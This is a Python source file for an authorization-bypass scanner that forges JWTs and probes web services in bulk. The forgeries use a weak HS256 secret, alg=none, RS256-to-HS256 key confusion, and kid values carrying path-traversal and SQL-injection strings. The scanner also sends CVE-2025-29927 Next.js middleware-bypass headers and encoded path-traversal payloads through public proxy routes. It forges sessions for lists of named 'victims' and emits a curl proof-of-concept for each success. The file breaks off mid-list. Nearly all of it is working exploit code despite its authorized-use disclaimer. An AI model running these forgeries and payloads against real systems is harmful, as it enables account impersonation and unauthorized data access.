#!/usr/bin/env python3
"""
Authorization-bypass checker for your OWN / explicitly-authorized targets.

Baseline check for every target URL:
  - response status must be 200 OK
  - Content-Type must be application/json or text/plain
  - response body must be non-empty (not 0 bytes)
  - trivial health-check bodies (OK / HEALTHY / PONG ...) are treated as false positives

On top of the baseline it can run several authorization-bypass tests:
  - JWT forgery         (--jwt-test):      weak HMAC secret, alg=none, RS256->HS256 confusion
  - JWT kid bypass      (--jwt-kid-test):  signature check skipped when a `kid` header is present
  - Next.js middleware  (--check-nextjs-cve): CVE-2025-29927 via x-middleware-subrequest
  - Proxy-path bypass   (--check-proxy-bypass): encoded path traversal through a public proxy route

Usage:
    python3 auth_checker.py -f targets.txt
    python3 auth_checker.py -f targets.txt -t 10 -w 20 -o results.json
    python3 auth_checker.py -f targets.txt --full -p paths.txt

Targets file format: one URL per line.
Empty lines and lines starting with '#' are ignored.

NOTE: Only run this against systems you own or are explicitly authorized to test.
"""

import argparse
import base64
import concurrent.futures
import hashlib
import hmac
import json
import os
import re
import secrets
import socket
import sys
import threading
import time
from dataclasses import dataclass, asdict, field
from typing import Optional
from urllib.parse import urlparse

import requests

try:
    from tqdm import tqdm as _tqdm
except ImportError:
    _tqdm = None

ALLOWED_CONTENT_TYPES = ("application/json", "text/plain")
ALG_NONE_CASES = ("none", "None", "NONE")  # some parsers compare `alg` case-sensitively


# ---------------------------------------------------------------------------
# DNS cache: if a host does not resolve at all (internal domain, typo, dead
# CNAME, etc.), there is no point in re-resolving it on EVERY single request
# (baseline + every JWT variant + every CVE payload + every proxy-bypass
# payload can be hundreds of attempts against the same host) and waiting for
# the resolver timeout each time. We resolve each host at most once per run
# (cached, thread-safe) and instantly fail every subsequent request to it.
_dns_cache: dict = {}
_dns_cache_lock = threading.Lock()


def _host_resolves(hostname: str) -> bool:
    with _dns_cache_lock:
        cached = _dns_cache.get(hostname)
    if cached is not None:
        return cached
    try:
        socket.getaddrinfo(hostname, None)
        resolved = True
    except socket.gaierror:
        resolved = False
    with _dns_cache_lock:
        _dns_cache[hostname] = resolved
    return resolved


def safe_get(url: str, **kwargs):
    """Wrapper around requests.get that first (with a cache) checks whether the
    host in `url` resolves - if not, it immediately raises
    requests.exceptions.ConnectionError without a real connection/DNS-timeout
    attempt, so existing `except requests.exceptions.RequestException` branches
    keep working unchanged."""
    return safe_request("GET", url, **kwargs)


def safe_request(method: str, url: str, **kwargs):
    """Same as safe_get, but for an arbitrary HTTP method (requests.request)."""
    hostname = urlparse(url).hostname
    if hostname and not _host_resolves(hostname):
        raise requests.exceptions.ConnectionError(
            f"Host does not resolve (cached, request skipped): {hostname}"
        )
    return requests.request(method, url, **kwargs)


def default_jwt_payload() -> dict:
    """Hardcoded generic-admin payload. iat/nbf/exp are computed at call time
    (not stored statically in code) so the token does not look expired or
    suspiciously old to a server that validates those claims."""
    now = int(time.time())
    return {
        "sub": "admin", "user": "admin", "role": "admin", "admin": True,
        "iat": now, "nbf": now - 60, "exp": now + 60 * 60 * 24 * 365,
    }

# CVE-2025-29927: Next.js middleware authorization bypass (CVSS 9.1).
# Affected versions: < 12.3.5, < 13.5.9, < 14.2.25, < 15.2.3.
# The x-middleware-subrequest header is used internally by Next.js to avoid
# looping middleware on internal subrequests. If it is present and matches the
# expected path/repetition, Next.js considers the request to have already
# passed through middleware and skips running it entirely - and with it any
# auth checks implemented inside that middleware.
NEXTJS_MIDDLEWARE_BYPASS_HEADER = "x-middleware-subrequest"
NEXTJS_MIDDLEWARE_BYPASS_PAYLOADS = [
    "middleware",
    "src/middleware",
    "middleware:middleware:middleware:middleware:middleware",
    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
    "pages/_middleware",
    "app/middleware",
]

# Trivial health-check-like response bodies (OK/HEALTHY/PONG, etc.) - such
# responses are treated as false positives: the server returned a generic
# health-check, not real data.
DEFAULT_TRIVIAL_BODY_VALUES = {
    "ok", "healthy", "true", "success", "pong", "up", "alive", "yes", "1", "0",
    "null", "none", "ready", "running", "active", "pass", "passed", "green",
}
HEALTH_LIKE_JSON_KEYS = {"status", "health", "state", "result", "message"}


def is_trivial_response(content: bytes, extra_trivial_values: Optional[set] = None) -> bool:
    """Decides whether a response body is a trivial health-check response
    (just 'OK'/'HEALTHY', etc.) rather than real data - to filter out false positives."""
    trivial_values = DEFAULT_TRIVIAL_BODY_VALUES | (extra_trivial_values or set())

    try:
        text = content.decode("utf-8", errors="ignore").strip()
    except Exception:
        return False

    if not text:
        return False

    # Plain text body: "OK", "healthy", "PONG", etc. (possibly wrapped in quotes)
    bare = text.strip("\"' \t\n").lower()
    if bare in trivial_values:
        return True

    # JSON wrapper like {"status": "ok"} / {"health": "OK", "message": "healthy"}
    try:
        data = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return False

    if isinstance(data, dict) and 1 <= len(data) <= 3:
        keys_lower = {k.lower() for k in data.keys()}
        if keys_lower & HEALTH_LIKE_JSON_KEYS:
            values_trivial = True
            for v in data.values():
                if isinstance(v, bool):
                    continue
                if isinstance(v, str) and v.strip("\"' \t\n").lower() in trivial_values:
                    continue
                values_trivial = False
                break
            if values_trivial:
                return True

    return False


def azure_b2c_jwt_payload() -> dict:
    """Hardcoded payload in the style of an Azure AD B2C token (iss/aud/oid/tfp/emails,
    etc.) - used with --jwt-azure-b2c and automatically as one of the profiles under
    --full. exp/nbf/iat are computed at call time, not stored statically in code."""
    now = int(time.time())
    return {
        "iss": "https://login.microsoftonline.com/00000000-0000-0000-0000-000000000000/v2.0/",
        "exp": now + 60 * 60 * 24 * 365,
        "nbf": now - 300,
        "iat": now,
        "aud": "00000000-0000-0000-0000-000000000000",
        "sub": "00000000-0000-0000-0000-000000000000",
        "oid": "00000000-0000-0000-0000-000000000000",
        "tid": "00000000-0000-0000-0000-000000000000",
        "tfp": "B2C_1_signupsignin",
        "given_name": "Test",
        "family_name": "Admin",
        "name": "Test Admin",
        "emails": ["admin@example.com"],
        "idp": "local",
        "roles": ["admin"],
        "extension_Role": "admin",
        "ver": "1.0",
    }


def parse_claim_overrides(claim_args: list[str]) -> dict:
    """Parses a list of 'KEY=VALUE' from --jwt-claim into a claims dict.
    The value is parsed as JSON (numbers, true/false, lists, objects); if that
    fails it stays a string."""
    overrides = {}
    for item in claim_args:
        if "=" not in item:
            print(f"[!] Invalid --jwt-claim (expected KEY=VALUE), skipped: {item}", file=sys.stderr)
            continue
        key, raw_value = item.split("=", 1)
        key = key.strip()
        raw_value = raw_value.strip()
        try:
            value = json.loads(raw_value)
        except json.JSONDecodeError:
            value = raw_value
        overrides[key] = value
    return overrides


def read_identities(path: str) -> list[dict]:
    """Reads a list of 'victims' (identity claims) from a JSON file:
    [{"sub": "...", "oid": "...", "emails": ["..."], "name": "..."}, ...]
    Each entry is merged over the base payload and tested separately."""
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print(f"[!] Could not read --jwt-identities: {e}", file=sys.stderr)
        sys.exit(1)

    if not isinstance(data, list):
        print("[!] --jwt-identities must be a JSON array of claim objects", file=sys.stderr)
        sys.exit(1)

    for i, identity in enumerate(data):
        if not isinstance(identity, dict):
            print(f"[!] Item {i} in --jwt-identities is not an object, skipped", file=sys.stderr)

    return [d for d in data if isinstance(d, dict)]


def identity_label(identity: dict) -> str:
    """Short human-readable identity label for console/report output."""
    for key in ("emails", "email", "sub", "oid", "name", "user"):
        if key in identity:
            val = identity[key]
            if isinstance(val, list):
                val = val[0] if val else ""
            return str(val)
    return json.dumps(identity, ensure_ascii=False)[:40]


@dataclass
class CheckResult:
    url: str
    ok: bool
    status_code: Optional[int] = None
    content_type: Optional[str] = None
    body_size: Optional[int] = None
    error: Optional[str] = None
    reason: Optional[str] = None  # why ok=False, when a status was received
    jwt_checks: list = field(default_factory=list)
    jwt_verdict: Optional[str] = None
    # "confirmed_vulnerable"      - server validates JWTs but accepted a forged one (secret/none/case)
    # "signature_not_validated"   - server does not check the signature at all (garbage token accepted too)
    # "no_auth_required"          - endpoint returns 200 even without a token (no auth required at all)
    # "protected"                 - all forged tokens rejected
    # None                        - jwt-test was not run
    nextjs_cve_checks: list = field(default_factory=list)
    nextjs_cve_verdict: Optional[str] = None
    # "confirmed_bypass" - x-middleware-subrequest header bypassed middleware (CVE-2025-29927)
    # "protected"        - bypass did not work
    # "not_applicable"   - endpoint was already reachable without the bypass
    # None               - check was not run
    kid_checks: list = field(default_factory=list)
    kid_verdict: Optional[str] = None
    # "confirmed_full_bypass"            - token with kid fully accepted (200 + data)
    # "signature_check_skipped_with_kid" - presence of kid disables signature validation
    #     (without kid the server complains about signature/key, with kid - about claims)
    # "differential_behavior_review"     - kid changes the response, needs manual review
    # "protected"                        - kid changes nothing, forged tokens rejected
    # None                               - check was not run


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def make_jwt_hs256(secret: str, payload: dict) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{payload_b64}.{b64url_encode(sig)}"


def make_jwt_none(payload: dict, alg_value: str = "none") -> str:
    header = {"alg": alg_value, "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    # some libraries expect an empty signature after the dot, some expect none at all
    return f"{header_b64}.{payload_b64}."


def make_jwt_garbage(payload: dict) -> str:
    """Token with a correct structure (HS256) but a deliberately invalid signature.
    Serves as a negative control: if the server accepts even this, it does not
    verify the JWT signature at all, and the issue is not a weak secret."""
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    garbage_sig = b64url_encode(secrets.token_bytes(32))
    return f"{header_b64}.{payload_b64}.{garbage_sig}"


def make_jwt_rs256_confusion(rsa_public_key_pem: bytes, payload: dict) -> str:
    """Classic RS256 -> HS256 key confusion attack.
    Relevant for Azure AD B2C and any token originally signed with RS256: the
    public RSA key (always public, available via /discovery/v2.0/keys or
    /.well-known/jwks.json) is used as the HMAC secret. If the server does not
    strictly pin the expected algorithm during verification, the forgery passes,
    because the library uses the same key for both RS256 and HS256."""
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(rsa_public_key_pem, signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{payload_b64}.{b64url_encode(sig)}"


def load_rsa_public_key(source: str, timeout: int = 10) -> bytes:
    """Loads a public RSA key (PEM) from a local file or a URL (e.g. a direct
    link to an Azure B2C tenant JWKS endpoint, if it has already been converted
    to PEM - see the hint in --help)."""
    if source.startswith(("http://", "https://")):
        resp = requests.get(source, timeout=timeout)
        resp.raise_for_status()
        return resp.content
    with open(source, "rb") as f:
        return f.read()


@dataclass
class JwtCheck:
    kind: str
    delivery: str  # "bearer" | "cookie"
    token: str
    status_code: Optional[int] = None
    content_type: Optional[str] = None
    body_size: Optional[int] = None
    accepted: bool = False  # True = server returned a valid response to a forged token -> likely vulnerable
    error: Optional[str] = None
    curl_poc: Optional[str] = None
    is_control: bool = False  # True = negative control (garbage signature), not counted as a forged success
    identity: Optional[str] = None  # identity label the token was forged for (--jwt-identities batch mode)
    is_trivial_body: bool = False  # True = body looks like a health-check (OK/HEALTHY) - excluded from accepted as a false positive


def build_curl_poc(url: str, delivery: str, token: str, header_name: str, cookie_name: str) -> str:
    if delivery == "bearer":
        return f"curl -i -H '{header_name}: Bearer {token}' '{url}'"
    else:
        return f"curl -i -H 'Cookie: {cookie_name}={token}' '{url}'"


def run_jwt_checks(url: str, timeout: int, verify_ssl: bool, base_headers: dict,
                    secret: str, jwt_payload: dict, jwt_header_name: str,
                    jwt_cookie_name: str, rsa_pubkey_pem: Optional[bytes] = None,
                    identity: Optional[str] = None,
                    ignore_trivial_body: bool = True,
                    extra_trivial_values: Optional[set] = None) -> list["JwtCheck"]:
    checks = []

    tokens = {
        "hs256_default_secret": (make_jwt_hs256(secret, jwt_payload), False),
    }
    for alg_case in ALG_NONE_CASES:
        tokens[f"alg_{alg_case}"] = (make_jwt_none(jwt_payload, alg_case), False)
    tokens["alg_none_empty_payload"] = (make_jwt_none({}), False)
    if rsa_pubkey_pem:
        tokens["rs256_to_hs256_confusion"] = (make_jwt_rs256_confusion(rsa_pubkey_pem, jwt_payload), False)
    # negative control: correct structure, deliberately invalid signature
    tokens["garbage_signature"] = (make_jwt_garbage(jwt_payload), True)

    # Each token is tried two ways: as a Bearer header and as a cookie
    delivery_modes = [
        ("bearer", {"headers": {jwt_header_name: "Bearer {token}"}}),
        ("cookie", {"cookies": {jwt_cookie_name: "{token}"}}),
    ]

    for kind, (token, is_control) in tokens.items():
        for mode_name, mode_conf in delivery_modes:
            headers = dict(base_headers)
            cookies = {}

            if "headers" in mode_conf:
                for h_name, h_val_tpl in mode_conf["headers"].items():
                    headers[h_name] = h_val_tpl.format(token=token)
            if "cookies" in mode_conf:
                for c_name, c_val_tpl in mode_conf["cookies"].items():
                    cookies[c_name] = c_val_tpl.format(token=token)

            try:
                resp = safe_get(url, timeout=timeout, verify=verify_ssl,
                                 headers=headers, cookies=cookies, allow_redirects=False)
            except requests.exceptions.RequestException as e:
                checks.append(JwtCheck(kind=kind, delivery=mode_name, token=token, error=str(e),
                                        is_control=is_control, identity=identity))
                continue

            content_type = resp.headers.get("Content-Type", "").split(";")[0].strip().lower()
            body_size = len(resp.content)
            trivial = ignore_trivial_body and is_trivial_response(resp.content, extra_trivial_values)
            accepted = (resp.status_code == 200 and content_type in ALLOWED_CONTENT_TYPES
                        and body_size > 0 and not trivial)

            checks.append(JwtCheck(
                kind=kind, delivery=mode_name, token=token, status_code=resp.status_code,
                content_type=content_type, body_size=body_size, accepted=accepted, is_control=is_control,
                curl_poc=build_curl_poc(url, mode_name, token, jwt_header_name, jwt_cookie_name),
                identity=identity, is_trivial_body=trivial,
            ))

    return checks


# ---------------------------------------------------------------------------
# JWT signature-validation bypass via the presence of a `kid` header
# ---------------------------------------------------------------------------
# Bug: the middleware verifies the signature ONLY when the JWT header has no
# `kid`. As soon as `kid` is present, signature verification is skipped and
# validation jumps straight to the claim checks (issuer/audience/exp). The
# cryptographic strength of the whole authentication then collapses to a
# NON-cryptographic string comparison.
#
# IMPORTANT: this bug cannot be caught by the "response became 200" criterion -
# the server may still return 401 with `kid`, but with a DIFFERENT error
# ("issuer invalid" instead of "signature key not found"). The check is
# therefore DIFFERENTIAL: we compare the response to a forged token WITHOUT
# `kid` against the SAME forged token WITH `kid`. If the presence of `kid`
# changes behavior (without kid - a signature/key error, with kid - a claim
# error), the signature stage was passed with a garbage signature.
KID_SIG_STAGE_HINTS = (
    "signature", "signing key", "key was not found", "key not found",
    "invalid signature", "verify", "signaturekey",
)
KID_LATER_STAGE_HINTS = (
    "issuer", "audience", "'aud'", "'iss'", "is invalid", "expired",
    "lifetime", "nbf", "claim", "token is expired",
)

# For the simple "kid disables signature validation" bug any non-empty kid is
# enough. The other values are typical payloads in case the kid is also injected
# into the key lookup (path traversal to a predictable empty key, SQLi) - the
# server may handle them differently, so it is useful to run the set.
DEFAULT_KID_VALUES = [
    "1",
    "nonexistent-key-id",
    "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
    "../../../../dev/null",      # path traversal -> empty/null key
    "' OR '1'='1",               # SQLi in key lookup by kid
]


def make_jwt_with_kid(payload: dict, kid_value: str, alg: str = "HS256",
                      sig_mode: str = "garbage") -> str:
    """JWT with a kid header and a deliberately invalid (or empty) signature.
    `alg` is the value of the alg header field (HS256/RS256/none - to test the
    algorithm-independence of the bug). sig_mode: 'garbage' | 'empty'."""
    header = {"alg": alg, "typ": "JWT", "kid": kid_value}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    if sig_mode == "empty":
        return f"{header_b64}.{payload_b64}."
    garbage_sig = b64url_encode(secrets.token_bytes(32))
    return f"{header_b64}.{payload_b64}.{garbage_sig}"


def make_jwt_no_kid_garbage(payload: dict, alg: str = "HS256") -> str:
    """The same forged token but WITHOUT kid - the baseline for the differential comparison."""
    header = {"alg": alg, "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    garbage_sig = b64url_encode(secrets.token_bytes(32))
    return f"{header_b64}.{payload_b64}.{garbage_sig}"


@dataclass
class KidCheck:
    kid_value: str
    alg: str
    delivery: str  # "bearer" | "cookie"
    status_code: Optional[int] = None
    content_type: Optional[str] = None
    body_size: Optional[int] = None
    body_snippet: Optional[str] = None      # start of the body, for comparing error messages
    accepted: bool = False                  # full bypass: 200 + real data
    differs_from_baseline: bool = False     # presence of kid changed the response
    signature_stage_passed: bool = False    # response moved PAST the signature stage
    error: Optional[str] = None
    curl_poc: Optional[str] = None


def _probe_jwt(url, token, delivery, timeout, verify_ssl, base_headers,
               jwt_header_name, jwt_cookie_name):
    headers = dict(base_headers)
    cookies = {}
    if delivery == "bearer":
        headers[jwt_header_name] = f"Bearer {token}"
    else:
        cookies[jwt_cookie_name] = token
    resp = safe_get(url, timeout=timeout, verify=verify_ssl,
                    headers=headers, cookies=cookies, allow_redirects=False)
    ct = resp.headers.get("Content-Type", "").split(";")[0].strip().lower()
    snippet = resp.content.decode("utf-8", errors="ignore").strip()[:300]
    return resp.status_code, ct, len(resp.content), snippet


def run_kid_signature_bypass_check(url, timeout, verify_ssl, base_headers,
                                   jwt_payload, jwt_header_name, jwt_cookie_name,
                                   kid_values=None, algs=("HS256", "RS256", "none"),
                                   ignore_trivial_body=True,
                                   extra_trivial_values=None) -> tuple[str, list["KidCheck"]]:
    """Differential check: does the server skip JWT signature validation when a
    `kid` header is present. Returns (verdict, checks).

    Verdicts:
    - confirmed_full_bypass            - token with kid fully accepted (200 + data)
    - signature_check_skipped_with_kid - without kid the server complained about the
                                         signature/key, with kid - about the claims
                                         (issuer/aud/exp): signature NOT verified when kid present
    - differential_behavior_review     - kid changes the response, but the stage cannot
                                         be determined unambiguously -> manual body review
    - protected                        - kid changes nothing, forged tokens rejected
    """
    kid_values = kid_values or DEFAULT_KID_VALUES
    checks = []

    # 1) Baseline: forged token WITHOUT kid, for each alg and delivery mode
    baseline = {}  # (alg, delivery) -> (status, snippet_lower) | None
    for alg in algs:
        token = make_jwt_no_kid_garbage(jwt_payload, alg)
        for delivery in ("bearer", "cookie"):
            try:
                st, _ct, _sz, snip = _probe_jwt(url, token, delivery, timeout, verify_ssl,
                                                base_headers, jwt_header_name, jwt_cookie_name)
                baseline[(alg, delivery)] = (st, snip.lower())
            except requests.exceptions.RequestException:
                baseline[(alg, delivery)] = None

    # 2) The same token but WITH kid - compared against the baseline
    for kid in kid_values:
        for alg in algs:
            token = make_jwt_with_kid(jwt_payload, kid, alg)
            for delivery in ("bearer", "cookie"):
                try:
                    st, ct, sz, snip = _probe_jwt(url, token, delivery, timeout, verify_ssl,
                                                  base_headers, jwt_header_name, jwt_cookie_name)
                except requests.exceptions.RequestException as e:
                    checks.append(KidCheck(kid_value=kid, alg=alg, delivery=delivery, error=str(e)))
                    continue

                trivial = ignore_trivial_body and is_trivial_response(
                    snip.encode("utf-8", "ignore"), extra_trivial_values)
                accepted = (st == 200 and ct in ALLOWED_CONTENT_TYPES and sz > 0 and not trivial)

                differs = False
                sig_passed = False
                base = baseline.get((alg, delivery))
                if base is not None:
                    base_status, base_snip = base
                    snip_l = snip.lower()
                    differs = (st != base_status) or (snip_l != base_snip)
                    base_is_sig = any(h in base_snip for h in KID_SIG_STAGE_HINTS)
                    now_is_sig = any(h in snip_l for h in KID_SIG_STAGE_HINTS)
                    now_is_later = any(h in snip_l for h in KID_LATER_STAGE_HINTS)
                    # signature stage passed if it previously complained about the
                    # signature/key, and now - about claims (issuer/aud/exp) or let us in
                    sig_passed = accepted or (base_is_sig and now_is_later and not now_is_sig)

                checks.append(KidCheck(
                    kid_value=kid, alg=alg, delivery=delivery,
                    status_code=st, content_type=ct, body_size=sz, body_snippet=snip,
                    accepted=accepted, differs_from_baseline=differs,
                    signature_stage_passed=sig_passed,
                    curl_poc=build_curl_poc(url, delivery, token, jwt_header_name, jwt_cookie_name),
                ))

    if any(c.accepted for c in checks):
        verdict = "confirmed_full_bypass"
    elif any(c.signature_stage_passed for c in checks):
        verdict = "signature_check_skipped_with_kid"
    elif any(c.differs_from_baseline for c in checks):
        verdict = "differential_behavior_review"
    else:
        verdict = "protected"
    return verdict, checks


def run_jwt_checks_multi_identity(url: str, timeout: int, verify_ssl: bool, base_headers: dict,
                                   secret: str, base_payload: dict, identities: list[dict],
                                   jwt_header_name: str, jwt_cookie_name: str,
                                   rsa_pubkey_pem: Optional[bytes] = None,
                                   ignore_trivial_body: bool = True,
                                   extra_trivial_values: Optional[set] = None) -> list["JwtCheck"]:
    """Runs the full set of JWT forgeries separately for each 'identity' from
    --jwt-identities, merging its claims over base_payload. Lets you check whether
    a session can be forged for specific known users (session hijack / impersonation),
    not just generic admin access."""
    all_checks = []
    for identity in identities:
        merged_payload = {**base_payload, **identity}
        label = identity_label(identity)
        checks = run_jwt_checks(
            url, timeout, verify_ssl, base_headers, secret, merged_payload,
            jwt_header_name, jwt_cookie_name, rsa_pubkey_pem, identity=label,
            ignore_trivial_body=ignore_trivial_body, extra_trivial_values=extra_trivial_values,
        )
        all_checks.extend(checks)
    return all_checks


def classify_jwt_verdict(baseline_ok: bool, jwt_checks: list) -> str:
    """Determines the final JWT verdict from all checks, taking the negative control into account."""
    if baseline_ok:
        return "no_auth_required"

    garbage_accepted = any(jc.accepted for jc in jwt_checks if jc.is_control)
    if garbage_accepted:
        return "signature_not_validated"

    forged_accepted = any(jc.accepted for jc in jwt_checks if not jc.is_control)
    if forged_accepted:
        return "confirmed_vulnerable"

    return "protected"


def combine_jwt_verdicts(verdicts: list) -> str:
    """Combines verdicts from several JWT profiles (generic_admin, azure_b2c, ...)
    into one, taking the worst (most critical) by priority."""
    if "no_auth_required" in verdicts:
        return "no_auth_required"
    if "confirmed_vulnerable" in verdicts:
        return "confirmed_vulnerable"
    if "signature_not_validated" in verdicts:
        return "signature_not_validated"
    return "protected"


@dataclass
class CveCheck:
    cve_id: str
    payload: str
    status_code: Optional[int] = None
    content_type: Optional[str] = None
    body_size: Optional[int] = None
    accepted: bool = False  # True = the request with the bypass header gave a real successful response
    error: Optional[str] = None
    curl_poc: Optional[str] = None
    is_trivial_body: bool = False


def build_curl_poc_header(url: str, header_name: str, header_value: str) -> str:
    return f"curl -i -H '{header_name}: {header_value}' '{url}'"


def check_cve_2025_29927(url: str, timeout: int, verify_ssl: bool, base_headers: dict,
                          baseline_ok: bool, ignore_trivial_body: bool = True,
                          extra_trivial_values: Optional[set] = None) -> tuple[str, list["CveCheck"]]:
    """Checks the Next.js middleware bypass via the x-middleware-subrequest header
    (CVE-2025-29927, CVSS 9.1).

    Verdict logic:
    - baseline_ok=True: endpoint is already reachable without the bypass - test is uninformative (not_applicable)
    - baseline_ok=False and one of the payload requests gave a real successful response: confirmed_bypass
    - baseline_ok=False and no payload worked: protected
    """
    checks = []

    for payload in NEXTJS_MIDDLEWARE_BYPASS_PAYLOADS:
        headers = dict(base_headers)
        headers[NEXTJS_MIDDLEWARE_BYPASS_HEADER] = payload

        try:
            resp = safe_get(url, timeout=timeout, verify=verify_ssl,
                             headers=headers, allow_redirects=False)
        except requests.exceptions.RequestException as e:
            checks.append(CveCheck(cve_id="CVE-2025-29927", payload=payload, error=str(e)))
            continue

        content_type = resp.headers.get("Content-Type", "").split(";")[0].strip().lower()
        body_size = len(resp.content)
        trivial = ignore_trivial_body and is_trivial_response(resp.content, extra_trivial_values)
        accepted = (resp.status_code == 200 and content_type in ALLOWED_CONTENT_TYPES
                    and body_size > 0 and not trivial)

        checks.append(CveCheck(
            cve_id="CVE-2025-29927", payload=payload, status_code=resp.status_code,
            content_type=content_type, body_size=body_size, accepted=accepted, is_trivial_body=trivial,
            curl_poc=build_curl_poc_header(url, NEXTJS_MIDDLEWARE_BYPASS_HEADER, payload),
        ))

    if baseline_ok:
        verdict = "not_applicable"
    elif any(c.accepted for c in checks):
        verdict = "confirmed_bypass"
    else:
        verdict = "protected"

    return verdict, checks


# ---------------------------------------------------------------------------
# Authorization bypass through a gateway proxy resource (AWS API Gateway
# {proxy+}, Swagger proxy, nginx/Envoy location blocks, etc.)
#
# Idea: a protected resource (e.g. /v1/pdt/esl-vendors/...) has a separate,
# deliberately public proxy path (e.g. /api/swagger/*) mounted on the same
# backend/integration, but NOT passing through the same authorizer/resource
# mapping as the direct path. If an encoded dot-dot inside the proxy path can
# "climb back" to the protected path (path traversal), the request reaches the
# backend as if it came in legitimately through the public proxy - and the
# authorizer bound to the direct resource is simply not invoked.
#
# We use ONLY encoded ".." variants (%2e%2e, etc.), because literal "../"
# almost always collapses in the HTTP client/proxy before being sent, while the
# whole point of the attack is that the API Gateway/server decodes it LATER than
# the route-based authorization check runs.
PROXY_BYPASS_PAYLOADS = [
    "",  # direct substitution without obfuscation - needed for genuinely open
         # catch-all resources (e.g. AWS API Gateway {proxy+} with Auth=None),
         # where there is no authorization at all and no traversal trick is
         # required; an encoded '../' in the other payloads sometimes breaks
         # routing at the app level (backend gets garbage instead of a real path)
    "%2e%2e/",
    "%2e%2e%2f",
    "..%2f",
    "..%252f",
    "%252e%252e/",
    "%252e%252e%252f",
    "..;/",
    "%2e%2e/%2e%2e/",
    "..%c0%af",
]

# Hardcoded list of public "proxy" paths most commonly left open on API
# Gateway/reverse-proxy without authorization (docs, swagger, health, static)
# and mounted on the same backend as the protected resources. Used in auto mode
# (--full + --paths) when no manual map (--proxy-bypass-map) is given: for each
# target x path x prefix a set of traversal payloads from PROXY_BYPASS_PAYLOADS
# is generated.
COMMON_PROXY_PREFIXES = [
    "api/swagger",
    "swagger",
    "swagger-ui",
    "api-docs",
    "api/docs",
    "docs",
    "openapi",
    "api/openapi",
    "redoc",
    "public",
    "static",
    "assets",
    "health",
    # Typical AWS API Gateway anti-pattern: a catch-all {proxy+} resource (e.g.
    # /prod/api/{proxy+}) with Auth=None, mounted on the same backend as the
    # other (protected) routes. Since it is open end-to-end without an authorizer,
    # a traversal payload is not required here - substituting the real path into
    # {payload}{path} is enough (payload may be empty, but since the template
    # already requires {payload}, all 9 variants run - including payload="../",
    # which the backend usually just swallows as part of the path). The most
    # common stage name: prod.
    "prod/api",
    "dev/api",
    "test/api",
    "stage/api",
    "qa/api",
]


def build_auto_proxy_bypass_pairs(targets: list[str], paths: list[str]) -> list[tuple[str, str]]:
    """Automatically generates (direct_URL, bypass_template) pairs for EVERY
    combination of target x path x hardcoded public prefix (COMMON_PROXY_PREFIXES),
    without needing a manual --proxy-bypass-map. Payloads are substituted later,
    in check_proxy_bypass_pair, from PROXY_BYPASS_PAYLOADS.

    Many prefixes already contain 'api' (api/swagger, prod/api, etc.). If a path
    from --paths ALSO starts with 'api/' (common case - path files usually hold a
    full path like /api/v1/users), a direct concatenation yields a doubled
    'api/api/...' after traversal (one '..' removes only the last prefix segment,
    not both). So for paths starting with 'api/' an extra variant WITHOUT that
    prefix is generated - it fits both the 'api/swagger' case (one '..' climbs
    exactly to api/) and the 'prod/api' case (which does not assume an 'api/' path)."""
    pairs = []
    for target in targets:
        base = target.rstrip("/")
        for path in paths:
            p = path.lstrip("/")
            direct_url = f"{base}/{p}"

            path_variants = {p}
            if p.startswith("api/"):
                path_variants.add(p[len("api/"):])

            for prefix in COMMON_PROXY_PREFIXES:
                for p_variant in path_variants:
                    template = f"{base}/{prefix}/{{payload}}{p_variant}"
                    pairs.append((direct_url, template))
    return pairs


@dataclass
class ProxyBypassCheck:
    payload: str
    direct_url: str
    bypass_url: str
    status_code: Optional[int] = None
    content_type: Optional[str] = None
    body_size: Optional[int] = None
    accepted: bool = False  # True = the bypass request returned real data -> likely bypass
    error: Optional[str] = None
    curl_poc: Optional[str] = None
    is_trivial_body: bool = False
    severity: Optional[str] = None  # LOW/MEDIUM/HIGH, computed only for accepted=True
    sensitive_indicators: list = field(default_factory=list)  # which exact patterns matched


# ---------------------------------------------------------------------------
# Severity classification of the response body for confirmed proxy-bypass findings.
#
# Logic: the authorization bypass itself is already a finding, but its criticality
# depends heavily on WHAT exactly leaked through the bypass:
#   - HIGH   - the response contains clear credentials/secrets (passwords, tokens,
#              API keys, Luhn-valid card numbers, IBAN, JWT-like strings)
#   - MEDIUM - the response contains PII-like fields (email, phone, address, name,
#              etc.), or the response structure is unknown/binary but the bypass is
#              confirmed - MEDIUM is the default severity for any confirmed bypass
#   - LOW    - the body is empty/health-check-like (see is_trivial_response) OR
#              contains no recognized sensitive fields/patterns - the bypass is
#              technically confirmed, but a data leak is not
# This is a simple key/pattern heuristic, not a replacement for manual review.
HIGH_SEVERITY_KEY_SUBSTRINGS = (
    "password", "passwd", "secret", "client_secret", "api_key", "apikey",
    "access_token", "refresh_token", "auth_token", "bearer_token", "private_key",
    "ssn", "social_security", "credit_card", "card_number", "cardnumber", "cvv",
